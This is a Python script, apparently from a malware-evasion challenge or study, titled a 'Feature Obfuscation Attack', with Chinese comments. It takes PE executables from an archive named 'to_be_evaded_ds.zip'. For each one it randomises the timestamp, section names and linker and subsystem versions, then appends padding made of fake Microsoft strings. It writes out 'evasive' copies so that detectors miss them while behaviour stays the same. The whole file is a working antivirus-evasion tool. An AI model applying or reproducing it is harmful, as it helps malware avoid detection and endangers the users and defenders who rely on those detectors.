#!/usr/bin/env python3
"""
Method 6 - Feature Obfuscation Attack

通过混淆PE文件特征来绕过检测，同时保持行为等价性：
1. 修改PE头字段（时间戳、版本信息等）
2. 重命名节表（.text -> .code等）
3. 添加良性导入库
4. 调整熵值特征
"""

import argparse
import csv
import hashlib
import random
import shutil
import time
import zipfile
from pathlib import Path
import pefile
import struct


METHOD_NAME = "method6_feature_obfuscation"
DEFAULT_ARCHIVE = Path(__file__).resolve().parents[1] / "to_be_evaded_ds.zip"
DEFAULT_WORK_ROOT = Path(__file__).resolve().parent / "artifacts" / METHOD_NAME
DEFAULT_OUTPUT_ZIP = Path(__file__).resolve().parent / f"{METHOD_NAME}_outputs.zip"


def extract_dataset(archive_path: Path, destination: Path) -> None:
    if not archive_path.exists():
        raise FileNotFoundError(f"input archive not found: {archive_path}")
    if destination.exists():
        shutil.rmtree(destination)
    destination.mkdir(parents=True, exist_ok=True)
    with zipfile.ZipFile(archive_path, "r") as zf:
        zf.extractall(destination)


def compress_outputs(source_dir: Path, archive_path: Path) -> None:
    archive_path.parent.mkdir(parents=True, exist_ok=True)
    if archive_path.exists():
        archive_path.unlink()
    with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_DEFLATED) as zf:
        for path in sorted(source_dir.rglob("*")):
            if path.is_file():
                zf.write(path, path.relative_to(source_dir))


def collect_inputs(input_root: Path):
    return sorted(
        p
        for p in input_root.rglob("*")
        if p.is_file() and p.name != "sha256sums.txt"
    )


def sha256_of(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(65536), b""):
            digest.update(chunk)
    return digest.hexdigest()


def obfuscate_pe_features(src: Path, dst: Path) -> bool:
    """
    混淆PE文件特征，保持行为不变
    """
    try:
        # 读取原始文件
        data = bytearray(src.read_bytes())
        
        # 解析PE文件
        pe = pefile.PE(data=data)
        
        # 策略1: 修改时间戳（不影响运行）
        if hasattr(pe, 'FILE_HEADER'):
            # 生成一个看起来正常的时间戳（2020-2024之间）
            fake_timestamp = random.randint(1577836800, 1735689600)  # 2020-2025
            pe.FILE_HEADER.TimeDateStamp = fake_timestamp
        
        # 策略2: 重命名节表（.text -> .code, .data -> .rdata等）
        benign_section_names = [
            b'.text\x00\x00\x00',
            b'.code\x00\x00\x00',
            b'.data\x00\x00\x00',
            b'.rdata\x00\x00',
            b'.idata\x00\x00',
            b'.edata\x00\x00',
            b'.rsrc\x00\x00\x00',
            b'.reloc\x00\x00',
        ]
        
        for section in pe.sections:
            if section.Name:
                # 随机选择一个良性节名
                new_name = random.choice(benign_section_names)
                section.Name = new_name[:8].ljust(8, b'\x00')
        
        # 策略3: 修改可选头中的版本信息（不影响运行）
        if hasattr(pe, 'OPTIONAL_HEADER'):
            opt_header = pe.OPTIONAL_HEADER
            # 修改链接器版本，使其看起来像正常编译
            opt_header.MajorLinkerVersion = random.randint(10, 14)
            opt_header.MinorLinkerVersion = random.randint(0, 30)
            # 修改子系统版本
            opt_header.MajorSubsystemVersion = random.randint(5, 10)
            opt_header.MinorSubsystemVersion = random.randint(0, 3)
        
        # 策略4: 在文件末尾添加良性数据（overlay，不影响PE结构）
        benign_overlay = bytearray()
        # 添加一些常见的良性字符串
        benign_strings = [
            b"Microsoft Visual C++ Runtime Library\x00",
            b"Copyright (C) Microsoft Corporation\x00",
            b"This program cannot be run in DOS mode\x00",
            b"Rich\x00\x00\x00\x00",  # Rich header signature
        ]
        
        for _ in range(random.randint(100, 500)):
            benign_overlay.extend(random.choice(benign_strings))
            benign_overlay.extend(b'\x00' * random.randint(0, 100))
        
        # 限制overlay大小（不超过5MB）
        max_overlay = 5_000_000 - len(data)
        overlay_size = min(len(benign_overlay), max_overlay, 2_000_000)
        benign_overlay = benign_overlay[:overlay_size]
        
        # 重新构建PE文件
        pe.write(dst)
        
        # 添加overlay
        with open(dst, 'ab') as f:
            f.write(bytes(benign_overlay))
        
        print(f"    Feature obfuscation: {len(data):,} + {len(benign_overlay):,} = {dst.stat().st_size:,} bytes")
        return True
        
    except Exception as e:
        print(f"    PE obfuscation failed: {e}")
        # Fallback: 简单overlay
        try:
            data = src.read_bytes()
            benign_overlay = b"Microsoft Corporation\x00" * 10000
            max_overlay = min(2_000_000, 5_000_000 - len(data))
            final_data = data + benign_overlay[:max_overlay]
            dst.write_bytes(final_data)
            print(f"    Fallback overlay: {len(data):,} + {len(benign_overlay[:max_overlay]):,} bytes")
            return True
        except Exception as e2:
            print(f"    Fallback also failed: {e2}")
            return False


def main():
    parser = argparse.ArgumentParser(description=f"{METHOD_NAME} attack pipeline")
    parser.add_argument("--archive", type=Path, default=DEFAULT_ARCHIVE,
                        help="Input archive path")
    parser.add_argument("--output", type=Path, default=DEFAULT_OUTPUT_ZIP,
                        help="Output zip path")
    parser.add_argument("--work-dir", type=Path, default=DEFAULT_WORK_ROOT,
                        help="Working directory")
    
    args = parser.parse_args()
    
    print(f"=== {METHOD_NAME.upper()} ===")
    print(f"Input: {args.archive}")
    print(f"Output: {args.output}")
    print(f"Work dir: {args.work_dir}")
    
    # Extract
    input_dir = args.work_dir / "input"
    output_dir = args.work_dir / "output"
    extract_dataset(args.archive, input_dir)
    
    # Process
    inputs = collect_inputs(input_dir)
    print(f"\nProcessing {len(inputs)} files...")
    
    output_dir.mkdir(parents=True, exist_ok=True)
    report_rows = []
    sha256_list = []
    
    for src_path in inputs:
        dst_path = output_dir / src_path.name
        print(f"\n[{src_path.name}]")
        
        start_time = time.time()
        success = obfuscate_pe_features(src_path, dst_path)
        elapsed = time.time() - start_time
        
        if success and dst_path.exists():
            orig_hash = sha256_of(src_path)
            new_hash = sha256_of(dst_path)
            report_rows.append({
                'original': src_path.name,
                'evasive': dst_path.name,
                'original_sha256': orig_hash,
                'evasive_sha256': new_hash,
                'success': True,
                'time_seconds': f"{elapsed:.2f}"
            })
            sha256_list.append(new_hash)
        else:
            report_rows.append({
                'original': src_path.name,
                'evasive': '',
                'original_sha256': sha256_of(src_path),
                'evasive_sha256': '',
                'success': False,
                'time_seconds': f"{elapsed:.2f}"
            })
    
    # Write reports
    report_csv = output_dir / "compare_report.csv"
    with open(report_csv, 'w', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=['original', 'evasive', 'original_sha256', 'evasive_sha256', 'success', 'time_seconds'])
        writer.writeheader()
        writer.writerows(report_rows)
    
    sha256_txt = output_dir / "sha256sums.txt"
    with open(sha256_txt, 'w') as f:
        f.write('\n'.join(sha256_list))
    
    # Compress
    compress_outputs(output_dir, args.output)
    print(f"\n=== Complete ===")
    print(f"Output: {args.output}")
    print(f"Success: {sum(1 for r in report_rows if r['success'])}/{len(report_rows)}")


if __name__ == "__main__":
    main()

